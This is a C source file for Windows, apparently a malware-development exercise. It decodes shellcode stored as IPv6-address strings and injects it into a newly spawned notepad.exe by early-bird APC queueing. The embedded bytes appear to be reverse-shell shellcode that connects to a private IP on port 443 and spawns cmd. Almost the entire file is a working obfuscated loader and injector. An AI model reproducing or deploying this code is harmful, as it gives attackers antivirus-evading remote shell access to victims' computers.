
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <wininet.h>
#include <TlHelp32.h>
#include <bcrypt.h>
#include <string.h>
#include <Psapi.h>
#include <winternl.h>

#pragma comment(lib, "Psapi.lib")


char* Ipv6Array[] = {
	"FC48:83E4:F0E8:C000:0000:4151:4150:5251", "5648:31D2:6548:8B52:6048:8B52:1848:8B52", "2048:8B72:5048:0FB7:4A4A:4D31:C948:31C0",
	"AC3C:617C:022C:2041:C1C9:0D41:01C1:E2ED", "5241:5148:8B52:208B:423C:4801:D08B:8088", "0000:0048:85C0:7467:4801:D050:8B48:1844",
	"8B40:2049:01D0:E356:48FF:C941:8B34:8848", "01D6:4D31:C948:31C0:AC41:C1C9:0D41:01C1", "38E0:75F1:4C03:4C24:0845:39D1:75D8:5844",
	"8B40:2449:01D0:6641:8B0C:4844:8B40:1C49", "01D0:418B:0488:4801:D041:5841:585E:595A", "4158:4159:415A:4883:EC20:4152:FFE0:5841",
	"595A:488B:12E9:57FF:FFFF:5D49:BE77:7332", "5F33:3200:0041:5649:89E6:4881:ECA0:0100", "0049:89E5:49BC:0200:01BB:C0A8:0010:4154",
	"4989:E44C:89F1:41BA:4C77:2607:FFD5:4C89", "EA68:0101:0000:5941:BA29:806B:00FF:D550", "504D:31C9:4D31:C048:FFC0:4889:C248:FFC0",
	"4889:C141:BAEA:0FDF:E0FF:D548:89C7:6A10", "4158:4C89:E248:89F9:41BA:99A5:7461:FFD5", "4881:C440:0200:0049:B863:6D64:0000:0000",
	"0041:5041:5048:89E2:5757:574D:31C0:6A0D", "5941:50E2:FC66:C744:2454:0101:488D:4424", "18C6:0068:4889:E656:5041:5041:5041:5049",
	"FFC0:4150:49FF:C84D:89C1:4C89:C141:BA79", "CC3F:86FF:D548:31D2:48FF:CA8B:0E41:BA08", "871D:60FF:D5BB:F0B5:A256:41BA:A695:BD9D",
	"FFD5:4883:C428:3C06:7C0A:80FB:E075:05BB", "4713:726F:6A00:5941:89DA:FFD5:9090:9090"
};

#define NumberOfElements 29


typedef NTSTATUS(NTAPI* fnRtlIpv6StringToAddressA)(
	PCSTR			S,
	PCSTR* Terminator,
	PVOID			Addr
	);


BOOL Ipv6Deobfuscation(IN CHAR* Ipv6Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

	PBYTE		pBuffer = NULL,
		TmpBuffer = NULL;

	SIZE_T		sBuffSize = NULL;

	PCSTR		Terminator = NULL;

	NTSTATUS	STATUS = NULL;

	fnRtlIpv6StringToAddressA  pRtlIpv6StringToAddressA = (fnRtlIpv6StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlIpv6StringToAddressA");
	if (pRtlIpv6StringToAddressA == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	sBuffSize = NmbrOfElements * 16;
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
	if (pBuffer == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	TmpBuffer = pBuffer;


	for (int i = 0; i < NmbrOfElements; i++) {
		if ((STATUS = pRtlIpv6StringToAddressA(Ipv6Array[i], &Terminator, TmpBuffer)) != 0x0) {
			printf("[!] RtlIpv6StringToAddressA Failed At [%s] With Error 0x%0.8X\n", Ipv6Array[i], STATUS);
			return FALSE;
		}

		TmpBuffer = (PBYTE)(TmpBuffer + 16);
	}

	*ppDAddress = pBuffer;
	*pDSize = sBuffSize;
	return TRUE;
}






BOOL CreateDebugProc(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {
	CHAR lpPath[MAX_PATH * 2];
	CHAR WnDr[MAX_PATH];

	STARTUPINFO            Si = { 0 };
	PROCESS_INFORMATION    Pi = { 0 };

	GetWindowsDirectoryA(WnDr, MAX_PATH);
	sprintf_s(lpPath, MAX_PATH * 2, "%s\\system32\\%s", WnDr, lpProcessName);

	Si.cb = sizeof(Si);	
	if (!CreateProcessA(lpPath, NULL, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &Si, &Pi)) {
			return FALSE;
		}
	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;
	return TRUE;


}



BOOL InjectShellCode(IN HANDLE hProcess, IN PVOID pAddress, IN DWORD dwSize, OUT PVOID* ppAddress)
{
	SIZE_T  sNumberOfBytesWritten = NULL;
	DWORD   dwOldProtection = NULL;

	*ppAddress = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*ppAddress == NULL)
	{
		return FALSE;
	}
	else {
		printf("[+] VirtualAllocEx Success\n");
		getchar();
	}

	if (!WriteProcessMemory(hProcess, *ppAddress, pAddress, dwSize, &sNumberOfBytesWritten))
	{
		return FALSE;
	}
	else {
		printf("[+] WriteProcessMemory Success\n");
		getchar();
	}

	if (!VirtualProtectEx(hProcess, *ppAddress, dwSize, PAGE_EXECUTE_READ, &dwOldProtection))
	{
		return FALSE;
	}
	else {
		printf("[+] VirtualProtectEx Success\n");
		getchar();
	}

	return TRUE;

}



BOOL ApcQueueUserApc(HANDLE hThread, PVOID pAddress) {
	QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL);
	return TRUE;
	 
	
}



int main() {
	DWORD   dwProcessId = NULL;
	HANDLE  hProcess = NULL,
		hThread = NULL;

	PBYTE   pDAddress = NULL;
	SIZE_T  sDSize = NULL;

	PVOID   pAddress = NULL;

	if (!Ipv6Deobfuscation(Ipv6Array, NumberOfElements, &pDAddress, &sDSize)) {
		printf("[!] Ipv6Deobfuscation Failed\n");
		return 1;
	}
	else {
		printf("[+] Ipv6Deobfuscation Success\n");
		getchar();
	}

	if (!CreateDebugProc("notepad.exe", &dwProcessId, &hProcess, &hThread)) {
		printf("[!] CreateDebugProc Failed\n");
		return 1;
	}
	else {
		printf("[+] CreateDebugProc Success\n");
		getchar();
	}

	if (!InjectShellCode(hProcess, pDAddress, sDSize, &pAddress)) {
		printf("[!] InjectShellCode Failed\n");
		return 1;
	}
	else {
		printf("[+] InjectShellCode Success\n");
		getchar();
	}

	if (!ApcQueueUserApc(hThread, pAddress)) {
		printf("[!] ApcQueueUserApc Failed\n");
		return 1;
	}
	else {
		printf("[+] ApcQueueUserApc Success\n");
		getchar();
	}

	printf("run it\n");
	getchar();

	DebugActiveProcessStop(dwProcessId); 

	return 0;
}
